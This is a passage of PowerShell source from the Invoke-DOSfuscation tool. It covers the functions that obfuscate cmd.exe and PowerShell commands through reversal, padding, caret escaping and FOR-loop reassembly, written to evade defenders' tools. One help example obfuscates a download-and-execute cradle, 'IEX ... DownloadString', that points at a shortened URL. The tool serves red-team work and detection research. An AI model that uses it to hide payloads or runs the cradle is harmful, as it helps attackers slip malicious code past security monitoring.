        $leftParen1  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount1) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $rightParen1 = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount1) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $leftParen2  = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount2) | foreach-object { '(' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
        $rightParen2 = Out-ObfuscatedArray -CommandIndexArray (@(1..$parenCount2) | foreach-object { ')' }) -RandomSpace:$RandomSpace -RandomSpaceRange:$RandomSpaceRange -RandomChar:$RandomChar -RandomCharRange:$RandomCharRange -RandomCharPercent:$RandomCharPercent -RandomCharArray:$RandomCharArray
    
        # Trim leading delimiters and whitespace from parentheses since they will cause errors for variable SET commands inside FOR loops and PowerShell payloads.
        $leftParen1  = $leftParen1.Trim(' ,;')
        $rightParen1 = $rightParen1.Trim(' ,;')
        $leftParen2  = $leftParen2.Trim(' ,;')
        $rightParen2 = $rightParen2.Trim(' ,;')
    }
    else
    {
        $leftParen1  = ''
        $rightParen1 = ''
        $leftParen2  = ''
        $rightParen2 = ''
    }
    
    # If -RandomChar argument is selected then handle random commas/semicolons later in this function but ensure that the cmd.exe path ends with a comma/semicolon.
    # This is to highlight an obfuscation technique that many defenders' tools do not handle when attempting to look up a file, namely many assume the extension is ".exe," and fail to find the file on disk.
    if ($RandomChar.IsPresent)
    {
        $CmdSyntax  = $CmdSyntax.TrimEnd()  + (Get-Random -InputObject $RandomCharArray)
        $Cmd2Syntax = $Cmd2Syntax.TrimEnd() + (Get-Random -InputObject $RandomCharArray)
    }

    # If $CmdSyntax involves a path then whitespace is required after $CmdSyntax.
    if (($CmdSyntax -match '(:[\/\\]|\\\\|\/\/|\%.*\%)') -and -not $CmdSyntax.EndsWith(' '))
    {
        $CmdSyntax += ' '
    }

    # If $Cmd2Syntax involves a path then whitespace is required after $Cmd2Syntax.
    if (($Cmd2Syntax -match '(:[\/\\]|\\\\|\/\/|\%.*\%)') -and -not $Cmd2Syntax.EndsWith(' '))
    {
        $Cmd2Syntax += ' '
    }

    # If using one of the more intricate Cmd syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricateCmdSyntax)
    {
        # No additional escaping is needed for $CmdSyntax since it is the very beginning of the command. Later intricate syntaxes ($Cmd2Syntax and $PowerShellSyntax) will need additional escaping.

        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        # Since this is the beginning of the whole command ensure that this single-alphanumeric variable is not accidentally present (particular NOT as a variable) in the remaining command.
        do
        {
            $cmdSyntaxVarName = Get-RandomVarName -UniqueFirstChar
        }
        while ($joinedSetSyntax.ToLower().Contains("%$cmdSyntaxVarName".ToLower()))
                
        if ($RandomCaret.IsPresent)
        {
            $cmdSyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $cmdSyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($CmdSyntax -match $intricateForLoopRegex1)
        {
            $CmdSyntax = $CmdSyntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $cmdSyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($CmdSyntax -match $intricateForLoopRegex2)
        {
            $CmdSyntax = $CmdSyntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $cmdSyntaxVarName)
        }
    }
    
    # If using one of the more intricate Cmd syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricateCmd2Syntax)
    {
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        $cmd2SyntaxVarName = Get-RandomVarName -UniqueFirstChar
        if ($RandomCaret.IsPresent)
        {
            $cmd2SyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $cmd2SyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($Cmd2Syntax -match $intricateForLoopRegex1)
        {
            $Cmd2Syntax = $Cmd2Syntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $cmd2SyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($Cmd2Syntax -match $intricateForLoopRegex2)
        {
            $Cmd2Syntax = $Cmd2Syntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $cmd2SyntaxVarName)
        }

        # Perform additional escaping for string tokens in the intricate syntax.
        $Cmd2SyntaxExtraCarets = $Cmd2Syntax
        $stringsToEscape = [System.Management.Automation.PSParser]::Tokenize($Cmd2Syntax,[ref] $null) | where-object { $_.Type -eq 'String' }
        foreach ($stringToEscape in $stringsToEscape)
        {
            # Perform single layer of escaping for delims= and tokens= values in intricate syntax and store in $Cmd2SyntaxExtraCarets variable for seletive use in final command assembly.
            if ($stringToEscape.Content.Replace('^','').ToLower().Contains('delims=') -and $stringToEscape.Content.Replace('^','').ToLower().Contains('tokens='))
            {
                if ($RandomCaret.IsPresent)
                {
                    $escapedString = Out-ObfuscatedCaret -StringToObfuscate $stringToEscape.Content.Replace('^','') -RandomCaretPercent:$RandomCaretPercent
                    $Cmd2SyntaxExtraCarets = $Cmd2SyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
                }
            }
            else
            {
                $escapedString = (Out-EscapedPowerShell -CommandToEscape $stringToEscape.Content -StdIn:$StdIn)
                $Cmd2Syntax = $Cmd2Syntax.Replace($stringToEscape.Content,$escapedString)
                $Cmd2SyntaxExtraCarets = $Cmd2SyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
            }
        }
    }
    
    # If using one of the more intricate PowerShell syntaxes that contains cmd.exe-style variables then replace these hard-coded variables with a custom variable from Get-RandomVarName that is guaranteed to be unique in the context of the rest of the current command to avoid errors.
    if ($intricatePowerShellSyntax)
    {
        # Retrieve unique single-alphanumeric variable name and replace in intricate syntax.
        $powershellSyntaxVarName = Get-RandomVarName -UniqueFirstChar
        if ($RandomCaret.IsPresent)
        {
            $powershellSyntaxVarName = Out-ObfuscatedCaret -StringToObfuscate $powershellSyntaxVarName -RandomCaretPercent:$RandomCaretPercent
        }

        # Swap variable names with newly-generated unique variable name from Get-RandomVarName above.
        if ($PowerShellSyntax -match $intricateForLoopRegex1)
        {
            $PowerShellSyntax = $PowerShellSyntax -replace $intricateForLoopRegex1 , ((-join $matches[0][0..1]) + $powershellSyntaxVarName + (-join $matches[0][3..($matches[0].Length - 1)]))
        }
        if ($PowerShellSyntax -match $intricateForLoopRegex2)
        {
            $PowerShellSyntax = $PowerShellSyntax -replace $intricateForLoopRegex2 , ((-join $matches[0][0..($matches[0].Length - 2)]) + $powershellSyntaxVarName)
        }

        # Perform additional escaping for string tokens in the intricate syntax.
        $powerShellSyntaxExtraCarets = $PowerShellSyntax
        $stringsToEscape = [System.Management.Automation.PSParser]::Tokenize($PowerShellSyntax,[ref] $null) | where-object { $_.Type -eq 'String' }
        foreach ($stringToEscape in $stringsToEscape)
        {
            # Perform single layer of escaping for delims= and tokens= values in intricate syntax and store in $powerShellSyntaxExtraCarets variable for seletive use in final command assembly.
            if ($stringToEscape.Content.Replace('^','').ToLower().Contains('delims=') -and $stringToEscape.Content.Replace('^','').ToLower().Contains('tokens='))
            {
                if ($RandomCaret.IsPresent)
                {
                    $escapedString = Out-ObfuscatedCaret -StringToObfuscate $stringToEscape.Content.Replace('^','') -RandomCaretPercent:$RandomCaretPercent
                    $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
                }
            }
            else
            {
                $escapedString = (Out-EscapedPowerShell -CommandToEscape $stringToEscape.Content -StdIn:$StdIn)
                $PowerShellSyntax = $PowerShellSyntax.Replace($stringToEscape.Content,$escapedString)
                $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace($stringToEscape.Content,$escapedString)
            }
        }
        
        # An additional layer of escaping for already-escaped '=' signs is required.
        if ($powerShellSyntaxExtraCarets -match '[^\^](\^{4})=')
        {
            $powerShellSyntaxExtraCarets = $powerShellSyntaxExtraCarets.Replace('^^^^=','^^^^^^^=')
        }
    }

    # Ensure proper spacing after $CmdSyntax in $DecoyString1.
    if (-not ($randomChar1 -or $CmdSyntax.EndsWith(' ')) -and -not $DecoyString1.StartsWith(' '))
    {
        $DecoyString1 = ' ' + $DecoyString1
    }

    # Ensure specific $randomChar* variables are at least one whitespace if they are not defined.
    if (-not $randomChar5) { $randomChar5 = ' ' }
    if (-not $randomChar7) { $randomChar7 = ' ' }
    if (-not $randomChar8) { $randomChar8 = ' ' }

    # Handle final syntax for -FinalBinary options of 'none' (default), 'powershell' and 'cmd' along with the optional -StdIn switch.
    if ($FinalBinary -eq 'none')
    {
        $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$randomChar4$call1$randomChar5$set $randomSpace2$commandVarNameSet=$joinedCommandVarNames$andAnd$randomChar6$leftParen2$call2$randomChar7%$commandVarNameGet%$rightParen2$randomSpace3`""
    }
    elseif ($FinalBinary -eq 'powershell')
    {
        if ($StdIn.IsPresent)
        {
            # If the input PowerShell command contains a semicolon then if it is delimiting numerous commands we cannot encapsulate the PowerShell command with parentheses.
            if ($Command.Contains(';'))
            {
                $leftParen2  = ''
                $rightParen2 = ''
            }
            else
            {
                # If parentheses remain to encapsulate the input PowerShell command then we need to remove any obfuscation delimiters (, and/or ;) from the obfuscated parentheses.
                $leftParen2  = $leftParen2  -replace '[,;]',''
                $rightParen2 = $rightParen2 -replace '[,;]',''
            }

            # Randomly decide to include "| powershell -" syntax inside the double quotes or outside.
            # It is weighted to the Else block which will include this syntax inside cmd.exe's double quotes.
            # However, the If block will be selected if multi-level escaping (i.e. '^^^') is used in the command.
            if (((Get-Random -InputObject @(0..2)) -eq 0) -or $joinedSetSyntax.Contains('^^^'))
            {
                if ($PowerShellSyntax -match '[^\^](\^{6})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^^^^^=','^^^^^^^=')
                }
                elseif ($PowerShellSyntax -match '[^\^](\^{2})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^=','^^^=')
                }

                $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$randomChar4$call1$randomChar5$set $randomSpace2$commandVarNameSet=$joinedCommandVarNames$andAnd$randomChar6$leftParen1$call2$randomChar7$echo$($randomChar8.Replace(',',';'))%$commandVarNameGet%$rightParen1`"$($randomChar9.Replace(',',';'))|$randomChar10$PowerShellSyntax $randomSpace3-$randomSpace4"
            }
            else
            {
                # Use PowerShell syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
                if ($intricatePowerShellSyntax)
                {
                    $PowerShellSyntax = $powerShellSyntaxExtraCarets
                }

                if ($PowerShellSyntax -match '[^\^](\^{6})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^^^^^=','^^^^^^^=')
                }
                elseif ($PowerShellSyntax -match '[^\^](\^{2})=')
                {
                    $PowerShellSyntax = $PowerShellSyntax.Replace('^^=','^^^=')
                }

                $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$randomChar4$call1$randomChar5$set $randomSpace2$commandVarNameSet=$joinedCommandVarNames$andAnd$randomChar6$leftParen1$call2$randomChar7$echo$($randomChar8.Replace(',',';'))%$commandVarNameGet%$($randomChar9.Replace(',',';'))|$randomChar10$PowerShellSyntax $randomSpace3-$randomSpace4$rightParen1`""
            }  
        }
        else
        {
            # Use PowerShell syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
            if ($intricatePowerShellSyntax)
            {
                $PowerShellSyntax = $powerShellSyntaxExtraCarets
            }
            
            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$randomChar4$call1$randomChar5$set $randomSpace2$commandVarNameSet=$joinedCommandVarNames$andAnd$randomChar6$leftParen1$call2$randomChar7$PowerShellSyntax$($randomChar8.Replace(',',';'))`"%$commandVarNameGet%`"$rightParen1$($randomChar9.Replace(',',';'))`""
        }
    }
    else
    {
        if ($StdIn.IsPresent)
        {
            # An additional layer of escaping for already-escaped '=' signs is required.
            if ($intricateCmd2Syntax)
            {
                $Cmd2Syntax = $Cmd2Syntax.Replace('^^=','^^^=')
            }

            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$randomChar4$call1$randomChar5$set $randomSpace2$commandVarNameSet=$joinedCommandVarNames$andAnd$randomChar6$call2$randomChar7$echo$randomChar8%$commandVarNameGet%`"$randomSpace3|$randomChar9$Cmd2Syntax$randomSpace4"
        }
        else
        {
            # Use Cmd syntax with carets added to delims= and values= value if -RandomCaret is selected and intricate syntax is used.
            if ($intricateCmd2Syntax)
            {
                $Cmd2Syntax = $cmd2SyntaxExtraCarets
            }

            $finalCommand = "$CmdSyntax$randomChar1$DecoyString1$VFlag$randomChar2$DecoyString2/$c1$randomSpace1`"$randomChar3$joinedSetSyntax$randomChar4$call1$randomChar5$set $randomSpace2$commandVarNameSet=$joinedCommandVarNames$andAnd$randomChar6$Cmd2Syntax$randomChar7/$c2$randomChar8%$commandVarNameGet%$randomSpace3`""
        }
    }

    # Throw warning if command size exceeds cmd.exe's 8,190 character limit.
    $cmdMaxLength = 8190
    if ($finalCommand.Length -gt $cmdMaxLength)
    {
        Write-Warning "This command exceeds the cmd.exe maximum allowed length of $cmdMaxLength characters! Its length is $($finalCommand.Length) characters."
        Start-Sleep -Seconds 1
    }

    # Return final command.
    return $finalCommand
}


function Out-DosReversedCommand
{
<#
.SYNOPSIS

Out-DosReversedCommand obfuscates input cmd.exe and powershell.exe commands via numerous methods supported by cmd.exe including:
    1)  numerous layers of escaping
    2)  index-based encoding and in-memory reassembly of command via cmd.exe's FOR loop (with /L argument for shorthand index syntax) with variable expansion enabled
    3)  intentionally-placed variable expansion inside FOR loop via cmd.exe's CALL and /V:ON switch
    4)  optional randomized casing
    5)  optional randomized variable names
    6)  optional whitespace obfuscation
    7)  optional caret obfuscation
    8)  optional index delimiters
    9)  optional garbage index delimiters
    10) reversing input command with optional character padding obfuscation
    11) FOR /L shorthand reverse index traversal (E.g. FOR /L (25,-1,1))
    12) optional comma, semicolon and parentheses obfuscation
    13) optional intricate syntax for cmd.exe and powershell.exe
    14) cmd.exe's and powershell.exe's ability to execute commands via Standard Input

Invoke-DOSfuscation Function: Out-DosReversedCommand
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Out-RandomCase, Get-RandomVarName, Out-SetVarCommand, Split-Command, Test-ContainsEscapableCharacter, Out-EscapedPowerShell, Test-ContainsUnevenDoubleQuote, Remove-Tab, Out-ObfuscatedArray, Out-ObfuscatedCaret (all located in Invoke-DOSfuscation.psm1)
Optional Dependencies: None
 
.DESCRIPTION

Out-DosReversedCommand obfuscates input cmd.exe and powershell.exe commands by reversing the command and performing in-memory command reassembly performed in the context of cmd.exe's FOR loop (with /L argument for shorthand reversed index syntax, like FOR /L (25,-1,1)) via string indexing with variable expansion enabled.

.PARAMETER Command

Specifies the command to obfuscate with string reversal, shorthand indexing and in-memory command reassembly via cmd.exe's FOR loop syntax (with /L argument for shorthand reversed index syntax, like FOR /L (25,-1,1)). This input command can also be obfuscated like: net""stat -""ano | find "127.0.0.1"

.PARAMETER FinalBinary

(Optional) Specifies the obfuscated command should be executed by a child process of powershell.exe, cmd.exe or no unnecessary child process (default). Some command escaping scenarios require at least one child process to avoid errors and will automatically be converted to such necessary syntax.

.PARAMETER ObfuscationLevel

(Optional) Specifies the preset obfuscation "profile" of all below parameters adjusted for -Command length. This is to simplify general usage of this function without becoming overwhelmed by all of the options.

.PARAMETER CmdSyntax

(Optional) Specifies the syntax to reference the initial cmd.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER Cmd2Syntax

(Optional) Specifies the syntax to reference the final cmd.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER PowerShellSyntax

(Optional) Specifies the syntax to reference powershell.exe (otherwise one is randomly assigned from pre-assembled options).

.PARAMETER StdIn

(Optional) Specifies that the final command be executed by ECHO'ing it into cmd.exe (or powershell.exe if -PowerShell is specified) to be executed via StdIn. This prevents the arguments from appearing in the final binary's command line arguments.

.PARAMETER DecoyString1

(Optional) Specifies the decoy string to set after the initial cmd.exe and before the /V or /C flags.

.PARAMETER DecoyString2

(Optional) Specifies the decoy string to set after the initial /V flag and before the /C flag.

.PARAMETER VFlag

(Optional) Specifies the decoy string (starting with "V") for the /V:ON flag as long as it is not /V:OFF.

.PARAMETER RandomCase

(Optional) Specifies that random casing be used wherever possible.

.PARAMETER RandomSpace

(Optional) Specifies that random whitespace be input wherever possible.

.PARAMETER RandomSpaceRange

(Optional) Specifies the range of the length of each randomly-selected whitespace if -RandomSpace is also selected.

.PARAMETER RandomFlag

(Optional) Specifies that random flag values be selected wherever possible (e.g. /C and /R interchangeability, environment variable encoding for /C and /V, etc.).

.PARAMETER RandomCaret

(Optional) Specifies that random carets be added before non-escapable characters in syntax components not affected by caret escape characters.

.PARAMETER RandomCaretPercent

(Optional) Specifies the percentage of characters to obfuscate with caret escape characters if -RandomCaret is also selected.

.PARAMETER RandomChar

(Optional) Specifies that random commas, semicolons and parentheses be input wherever possible in the command.

.PARAMETER RandomCharRange

(Optional) Specifies the range of the count of commas, semicolons and parentheses to be input wherever possible in the command if -RandomChar is also selected.

.PARAMETER RandomCharPercent

(Optional) Specifies the percentage of eligible characters to insert commas, semicolons and parentheses into if -RandomChar is also selected.

.PARAMETER RandomCharArray

(Optional) Specifies the character or array of characters (only comma and semicolon) to use if -RandomChar is also selected.

.PARAMETER RandomPadding

(Optional) Specifies that random padding characters (defined in RandomPaddingCharArray with amount defined in RandomPaddingFactor) be input wherever possible in the reversed command in the initial environment variable instantiation.

.PARAMETER RandomPaddingFactor

(Optional) Specifies the number of padding characters to be inserted between each character of the reversed command if -RandomPadding is also selected.

.PARAMETER RandomPaddingCharArray

(Optional) Specifies the custom array of padding characters to insert between each character of the reversed command if -RandomPadding is also selected.

.PARAMETER VarNameSpecialChar

(Optional) Specifies that variable names to be comprised entirely of special characters.

.PARAMETER VarNameWhitespace

(Optional) Specifies that variable names to be comprised entirely of whitespace characters following a mandatory initial non-VarNameWhitespace character (randomly-selected special character).

.EXAMPLE

C:\PS> 'netstat -ano' | Out-DosReversedCommand

cmd /V:ON/C"set m3K=ona- tatsten&&for /L %h in (11,-1,0)do set 8D=!8D!!m3K:~%h,1!&&if %h equ 0 call %8D:~-12%"

.EXAMPLE

C:\PS> 'netstat -ano' | Out-DosReversedCommand -ObfuscationLevel 3

^F^O^R    ;   ,    ,    /^F   ,  ,  ,  ,   ,   "      delims=3o=h.   tokens=      +1    "    ,  ,   ,  ,   %^R   ,    ,   ,   ,    ;   ,   ^in   ;   ;   ;   ,   ,  ,   ,  (    ;    ,   ,   '  ,   ;  ;   a^^s^^S^^O^^c  ,  ;  ;  ,   ^|  ;  ;  ;   ;  ,   ^^f^^iN^^D^^s^^T^^r    ;   ;    ,   ,   ;    ,   ,  ^^m^^d^=       '  ;  ,  ,    )  ,  ,   ;   ^D^o   ,   ,   ;   ,  ;  ,  %^R,   ;  ;    ;  LymVfXE^/V-^52^hunI^VnS ^  -^R^an^d^om^Ca^re^t^P^erc^ent:^90    ,   ;   ;   ;  ,   p/^c    "    ,  ;   ,    ,  (     ;    ;      ;   ;    ;    ;      (       (    ,     ,   (   ;    ;    ;   ;   ;    ;   ;      (       ;   ;       ;   ;       ;     (   ,       ,     (^s^E^T ^ ^ ^ ^~^?^]=^G^)^7^}^d^o^*^]^I^+^/n^P^+^*^Z^e^a^{^7^3^S^$^-^>^B^m^1^6^ ^9^>^R^{^z^t^]^_^v^*^Fa^L^c7^0^^tz^6x^~^K^sO^\^4^X^7^t^d^&^z^5N^e^W^K^(^L^+n)      ,       ,      ,     ,     ,      ,   ,   )       ,   ,   ,       ,      ,    )   ,    ;     ,      ;   ,       ;       ,       ;     ,     )    ,       ;     ,   ;      ,    ;      ,   )      ,     ,   ,   ,    ,      )     ,      ;   ,     ;      ,   ;   ,    ;     ,       )&&         ,  ,    ;  ;   ,   ^F^O^R  ,  ;   ,   ;  ;  ,    ;  /^l    ,   ,   ;   ;    ,    ,   %^X    ;    ;  ;  ;  ^in   ,   ,    ;  ;   ;  ,    (^ ^ ^ ^,^ ^ ^ ^ ^ ^ ^ ^,^  ^ ^,^ ^ ^ ^ ^,^ ^ ^ ^ ^+^7^1^ ^ ^ ^,^ ^ ^ ^ ^ ^ ^,^  ^ ^,^ ^ ^ ^ ^ ^ ^ -^6^ ^ ^  ^,^  ^  ^ ^,^ ^ ^ ^  ^ ^ ^,^   ^  ^ ^,^  ^   ^ ^ ^,^ ^  ^ +^5^ ^ ^ ^,^ ^  ,^ ^ ^ ^ )  ,    ,  ;   ^D^O   ;  ;  ,  ;    ,    (    ,   ,    (   ;     ;     ;     ;   (    ,      ,    ,     (      ,      ,       ,    (  ,  ,  ;   ;  ;   ^s^e^T     ^`^]^-^$=!^`^]^-^$!!^~^?^]:~       %^X,   1!)    ,      )    ,   ,    )   ,       ,       ,    )       ;      ;     ;      ;      )&   ,  ,   ,   ;  ;   ;   ,  ^i^f   ,   ;    ,   %^X  ;  ;    ,   ,   ;    ;  ,      ;   ;    ,   ,  ;  ^L^E^q  ;  ,   ;  ,  ;    ,    ^5  ,  ;   ,   ;  ;  ,  (    ;      ;   ;   ;    ;    ;    ;    (      ;   ;      ;   ;    (      ;      ;    ;    ;       (    (^c^a^L^L   ,  ;  ;  %^`^]^-^$:^~^  ^ ^ ^ ^-1^2%       )    ,    ,    ,      )       ,       ,   ,     )      )   ,   ,      )    "

.EXAMPLE

C:\PS> Out-DosReversedCommand -Command 'netstat -ano' -CmdSyntax '%ProgramData:~0,1%%ProgramData:~9,2%' -RandomPadding -StdIn

%ProgramData:~0,1%%ProgramData:~9,2% /V:ON/C"set ylHS=-[Io xunWLda40;-l^^b iost^|:ma{u9ti^<@s*HntOJMe3;'n&&for /L %T in (47,-4,3)do set Q8Z=!Q8Z!!ylHS:~%T,1!&&if %T equ 3 call %Q8Z:~5%"

.EXAMPLE

C:\PS> Out-DosReversedCommand -Command 'net""stat -""ano | find "0.0.0.0"' -CmdSyntax 'c:\does\not\exist\..\..\..\windows\system32\cmd.exe' -RandomCase -RandomSpace -VarNameSpecialChar -RandomPadding -RandomPaddingFactor 15 -RandomPaddingCharArray @('_','-','/','\') -StdIn

C:\DoES\NOT\ExiST\..\..\..\wiNDOWS\sYsTEM32\cMD.ExE /V:o /c  "seT -#@=\/_/--/-\\/___-"--\_\///-_-__\\0---_/___///-\\\._//\_\/_-\_\---0\/\/__\-__--//\.-\-_/-___\\-///0\_/-/\__-\-/-\_.-\/\--\/__/-__\0-\/-/-\-_//_\_\"_\\\--_/_//_\-- /-/_//--__-\\_\d--/_/-\-\/_/_\\n-////---\_\_\_\i_/\_/-_-\\_\-//f_\-\_-/-/-\/__\ /_-_\\--\_\/-_/^|//-\\-__--//__\^^\_\-///-_\_--/_ \-\-_///_-/-\\_o-\_\__-/-/-/\\/n\-__/-/_-/\\_/-a__\-_//-/--\\\""__\-_//-/--\\\""_\-_-/\/-/_\-\_--\-_-\_\-__/\// \-_-/\_/-\/-__/t/___-//\\/--_\-a_\_\/\/_-\/---_t_--/\\-/_\_/-/_s_/__/\/--/-\_-""_/__/\/--/-\_-""/-\/--_/-\/\__\t\-//_/-_/\\-\__e/\/\/-__-\\-_-/n&For /L  %G iN (  543   ,    -16,    15   )  Do   seT    ,?*@=!,?*@!!-#@:~%G, 1!&  If %G==  15 ecHO !,?*@:~ 6! | FOR /F "delims=1f=Z tokens=2" %U IN ('assoc^^^|findstr md^^^=')DO %U "

.EXAMPLE

C:\PS> Out-DosReversedCommand -Command 'IEX (New-Object Net.WebClient).DownloadString("http://bit.ly/L3g1t")' -RandomCase -RandomSpace -RandomSpaceRange @(5..15) -VarNameWhitespace -FinalBinary 'powershell' -RandomChar -RandomCharRange @(3..7) -RandomCharPercent 65 -RandomPadding -RandomPaddingFactor 2

CMd.eXe,       ,   ,        ,       ,       ,       ,       /V:                     ,        ,        ,        ,     ,    ,     ,     /c             "        ,    ,       ,       ,    ,   (               ,            (     ,               (            ,              (              ,     ,     ,          ,          ,            (         ,         ,       ,         ,               ,             ,          ,          (sET      \  =%K^)T7"u]\@GtCS1v#gx{3K5LmI/]ky#^(llL.:0ti`iFrb5d/yh/5`:p-ptytXdt$^&h.P"sd\bc^(0igQBnPuiz:r;bt@yS0Jd~na$Ko=Ul7Gn#8wy@ojrD@l.rP^)Rbt^(*nqSeTgi73lxfCxmbR^^eN]Wlj.SQtaveDUNJi g^(t;Kc[ye_]j\pb5^)Oe$-Kvwf1e^<{Nop^(EB ?wXEBEfYI)             ,              )     ,              ,          ,     ,      ,        )          ,              ,       ,      ,              ,         ,          ,              )      ,              )      ,       ,              ,             )&&              ,     ,       ,       ,   ,      ,    For      ,      ,      ,   ,     ,   ,     ,   /L     ,       ,     ,     ,        %s    ,     ,      ,    ,    ,        ,   ,       IN     ,   ,       ,      ,    ,   ,        (               ,               ,        ,        ,      +209       ,             ,         ,       ,      ,             ,             ,         -3          ,             ,               ,            +2        )   ,   ,   ,   ,     ,      ,      ,   Do      ,    ,   ,    ( , ( , , ( , , ( ( ( , , (        SET        *    =!*    !!\  :~              %s,     1!)       ,             ,        ,     ,       ,      )         ,          ,     ,        ,               ,               ,              ,       )        ,              )      ,               ,               ,            ,              ,        )     ,            )              ,           )&    ,      ,       ,       ,    iF   ,      ,    ,   ,    ,       ,      %s       ,        ,        ,   ,     ,      ,       ,    EqU      ,    ,    ,     ,       ,       ,       +2      ,     ,   ,       ,        ,       (                                                   (                                                                                          (                                                                          (                        (                                 (                                                                                      (POwERSHELl.EXE      ;   ;      ;        "!*    :~       +7!")   )    )   ) )   ) )      ;     ;   ;       ;        ;       "

.NOTES

This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    [CmdletBinding()]
    param (
        [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
        [System.String]
        $Command,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet('cmd','powershell','none')]
        [System.String]
        $FinalBinary = 'none',
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateSet(1,2,3)]
        [System.Int16]
        $ObfuscationLevel,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $CmdSyntax = (Get-Random -InputObject @('cmd','cmd.exe',(Get-ObfuscatedCmd -ObfuscationType env),(Get-ObfuscatedCmd))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $Cmd2Syntax = (Get-Random -InputObject @('cmd','cmd.exe',(Get-ObfuscatedCmd -ObfuscationType env),(Get-ObfuscatedCmd))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [System.String]
        $PowerShellSyntax = (Get-Random -InputObject @('powershell','powershell.exe',(Get-ObfuscatedPowerShell -ObfuscationType env),(Get-ObfuscatedPowerShell))),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $StdIn,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '([&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|\/[abcdefkqrstuv\?])') } )]
        [System.String]
        $DecoyString1,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '([&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|\/[abcdefkqrstuv\?])') } )]
        [System.String]
        $DecoyString2,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_.Trim() -notmatch '(^[^v\^] |[&|<>]|^\"[^"]|[^"]\"$|[^"]\"[^"]|[^^]\/[abcdefkqrstuv\?])') -and -not ($_.Trim().ToLower().StartsWith('v:of')) } )]
        [System.String]
        $VFlag = (Get-Random -InputObject @('V','V:','V:O','V:ON')),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCase,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomSpace,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [ValidateScript( { ($_ | sort-object | select-object -First 1) -ge 0 } )]
        [System.Object[]]
        $RandomSpaceRange = @(0..4),
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomFlag,
        
        [Parameter(Position = 0, Mandatory = $false)]
        [Switch]
        $RandomCaret,
